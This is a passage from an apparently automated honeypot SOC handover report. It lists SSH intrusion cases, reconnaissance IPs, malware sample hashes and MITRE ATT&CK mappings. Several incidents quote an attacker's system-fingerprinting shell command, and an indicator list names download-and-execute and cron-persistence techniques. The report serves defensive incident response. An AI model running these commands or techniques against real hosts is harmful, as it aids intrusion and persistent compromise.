| `2026-09-01 22:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63614ac2f062

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 22:49 |
| **Last Seen** | 2026-09-01 22:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:49:44` | `cowrie.session.connect` |
| `2026-09-01 22:49:44` | `cowrie.client.version` |
| `2026-09-01 22:49:44` | `cowrie.client.kex` |
| `2026-09-01 22:49:45` | `cowrie.login.success` |
| `2026-09-01 22:49:45` | `cowrie.direct-tcpip.request` |
| `2026-09-01 22:49:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 22:49:45` | `cowrie.direct-tcpip.data` |
| `2026-09-01 22:49:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2752436c049b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:50 |
| **Last Seen** | 2026-09-01 22:51 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:50:51` | `cowrie.session.connect` |
| `2026-09-01 22:50:53` | `cowrie.client.version` |
| `2026-09-01 22:50:53` | `cowrie.client.kex` |
| `2026-09-01 22:50:59` | `cowrie.login.success` |
| `2026-09-01 22:51:01` | `cowrie.session.params` |
| `2026-09-01 22:51:01` | `cowrie.command.input` |
| `2026-09-01 22:51:01` | `cowrie.command.input` |
| `2026-09-01 22:51:01` | `cowrie.command.input` |
| `2026-09-01 22:51:01` | `cowrie.command.input` |
| `2026-09-01 22:51:01` | `cowrie.command.input` |
| `2026-09-01 22:51:01` | `cowrie.command.success` |
| `2026-09-01 22:51:01` | `cowrie.command.input` |
| `2026-09-01 22:51:01` | `cowrie.command.input` |
| `2026-09-01 22:51:01` | `cowrie.command.input` |
| `2026-09-01 22:51:01` | `cowrie.command.input` |
| `2026-09-01 22:51:01` | `cowrie.log.closed` |
| `2026-09-01 22:51:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e496f2fce5c9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:52 |
| **Last Seen** | 2026-09-01 22:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:52:09` | `cowrie.session.connect` |
| `2026-09-01 22:52:10` | `cowrie.client.version` |
| `2026-09-01 22:52:10` | `cowrie.client.kex` |
| `2026-09-01 22:52:16` | `cowrie.login.success` |
| `2026-09-01 22:52:18` | `cowrie.session.params` |
| `2026-09-01 22:52:18` | `cowrie.command.input` |
| `2026-09-01 22:52:18` | `cowrie.command.input` |
| `2026-09-01 22:52:18` | `cowrie.command.input` |
| `2026-09-01 22:52:18` | `cowrie.command.input` |
| `2026-09-01 22:52:18` | `cowrie.command.input` |
| `2026-09-01 22:52:18` | `cowrie.command.success` |
| `2026-09-01 22:52:18` | `cowrie.command.input` |
| `2026-09-01 22:52:18` | `cowrie.command.input` |
| `2026-09-01 22:52:18` | `cowrie.command.input` |
| `2026-09-01 22:52:18` | `cowrie.command.input` |
| `2026-09-01 22:52:18` | `cowrie.log.closed` |
| `2026-09-01 22:52:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aecd68a04d71

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:53 |
| **Last Seen** | 2026-09-01 22:53 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:53:27` | `cowrie.session.connect` |
| `2026-09-01 22:53:28` | `cowrie.client.version` |
| `2026-09-01 22:53:28` | `cowrie.client.kex` |
| `2026-09-01 22:53:34` | `cowrie.login.success` |
| `2026-09-01 22:53:36` | `cowrie.session.params` |
| `2026-09-01 22:53:36` | `cowrie.command.input` |
| `2026-09-01 22:53:36` | `cowrie.command.input` |
| `2026-09-01 22:53:36` | `cowrie.command.input` |
| `2026-09-01 22:53:36` | `cowrie.command.input` |
| `2026-09-01 22:53:36` | `cowrie.command.input` |
| `2026-09-01 22:53:36` | `cowrie.command.success` |
| `2026-09-01 22:53:36` | `cowrie.command.input` |
| `2026-09-01 22:53:36` | `cowrie.command.input` |
| `2026-09-01 22:53:36` | `cowrie.command.input` |
| `2026-09-01 22:53:36` | `cowrie.command.input` |
| `2026-09-01 22:53:36` | `cowrie.log.closed` |
| `2026-09-01 22:53:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb4874764f9c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:54 |
| **Last Seen** | 2026-09-01 22:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:54:47` | `cowrie.session.connect` |
| `2026-09-01 22:54:48` | `cowrie.client.version` |
| `2026-09-01 22:54:48` | `cowrie.client.kex` |
| `2026-09-01 22:54:53` | `cowrie.login.success` |
| `2026-09-01 22:54:55` | `cowrie.session.params` |
| `2026-09-01 22:54:55` | `cowrie.command.input` |
| `2026-09-01 22:54:55` | `cowrie.command.input` |
| `2026-09-01 22:54:55` | `cowrie.command.input` |
| `2026-09-01 22:54:55` | `cowrie.command.input` |
| `2026-09-01 22:54:55` | `cowrie.command.input` |
| `2026-09-01 22:54:55` | `cowrie.command.success` |
| `2026-09-01 22:54:55` | `cowrie.command.input` |
| `2026-09-01 22:54:55` | `cowrie.command.input` |
| `2026-09-01 22:54:55` | `cowrie.command.input` |
| `2026-09-01 22:54:55` | `cowrie.command.input` |
| `2026-09-01 22:54:55` | `cowrie.log.closed` |
| `2026-09-01 22:54:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **10** | 2026-09-01 19:07 | 2026-09-01 22:54 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `69.140.158[.]108` | **4** | 2026-09-01 19:39 | 2026-09-01 19:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]193` | **3** | 2026-09-01 20:38 | 2026-09-01 20:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]217` | **3** | 2026-09-01 20:39 | 2026-09-01 21:31 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `91.218.45[.]54` | **3** | 2026-09-01 21:40 | 2026-09-01 21:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `173.255.225[.]25` | **2** | 2026-09-01 20:28 | 2026-09-01 20:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.169.52[.]173` | **2** | 2026-09-01 19:12 | 2026-09-01 19:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `58.218.178[.]134` | **2** | 2026-09-01 22:14 | 2026-09-01 22:16 | 2m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]188` | **2** | 2026-09-01 20:54 | 2026-09-01 20:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `94.231.136[.]190` | **2** | 2026-09-01 22:43 | 2026-09-01 22:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.99.32[.]140` | 1 | 2026-09-01 20:18 | 2026-09-01 20:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.13.46[.]38` | 1 | 2026-09-01 22:07 | 2026-09-01 22:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.88.48[.]171` | 1 | 2026-09-01 21:59 | 2026-09-01 22:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `117.187.180[.]162` | 1 | 2026-09-01 19:51 | 2026-09-01 19:53 | 94s | 0 | `T1592` | 🟢 LOW |
| `118.145.237[.]236` | 1 | 2026-09-01 19:57 | 2026-09-01 19:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.26.110[.]171` | 1 | 2026-09-01 20:46 | 2026-09-01 20:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.14.34[.]219` | 1 | 2026-09-01 22:48 | 2026-09-01 22:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `171.114.224[.]83` | 1 | 2026-09-01 21:41 | 2026-09-01 21:41 | 10s | 0 | `T1592` | 🟢 LOW |
| `180.106.80[.]16` | 1 | 2026-09-01 19:51 | 2026-09-01 19:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.137[.]24` | 1 | 2026-09-01 22:08 | 2026-09-01 22:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `200.59.122[.]233` | 1 | 2026-09-01 22:13 | 2026-09-01 22:13 | 10s | 0 | `T1592` | 🟢 LOW |
| `212.32.212[.]200` | 1 | 2026-09-01 22:36 | 2026-09-01 22:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `27.201.110[.]150` | 1 | 2026-09-01 22:30 | 2026-09-01 22:30 | 10s | 0 | `T1592` | 🟢 LOW |
| `31.41.94[.]255` | 1 | 2026-09-01 19:35 | 2026-09-01 19:35 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-09-01 22:04 | 2026-09-01 22:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-09-01 19:44 | 2026-09-01 19:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.77.61[.]56` | 1 | 2026-09-01 20:38 | 2026-09-01 20:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]59` | 1 | 2026-09-01 20:38 | 2026-09-01 20:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-09-01 20:38 | 2026-09-01 20:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]84` | 1 | 2026-09-01 20:36 | 2026-09-01 20:37 | 15s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.79.207[.]110` | US | Linode | **100** ⚠️ | 50 |
| `193.163.187[.]76` | AL | MyTv-Alb SH.P.K. | **100** ⚠️ | 2 |
| `31.41.94[.]255` | UA | New Information Systems PP | **100** ⚠️ | 1 |
| `117.187.180[.]162` | CN | China Mobile Communications Corporation | **100** ⚠️ | 21 |
| `200.59.122[.]233` | AR | Sinectis S.A. | **100** ⚠️ | 0 |
| `45.79.115[.]59` | US | Linode | **100** ⚠️ | 50 |
| `173.255.225[.]25` | US | Linode | **100** ⚠️ | 50 |
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `212.32.212[.]200` | RU | Network of the SF OAO VolgaTelecom | **100** ⚠️ | 3 |
| `115.88.48[.]171` | KR | LG Uplus | **100** ⚠️ | 36 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 213 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 184 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 86 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 86 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 85 |

---

## 🔕 False Positive Summary (25 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 8 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 13 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 262 cases |
| Tool 34  | Credential Extractor        | ✅ 213 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 17 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 68 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 25 filtered (9.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 41 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 20 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

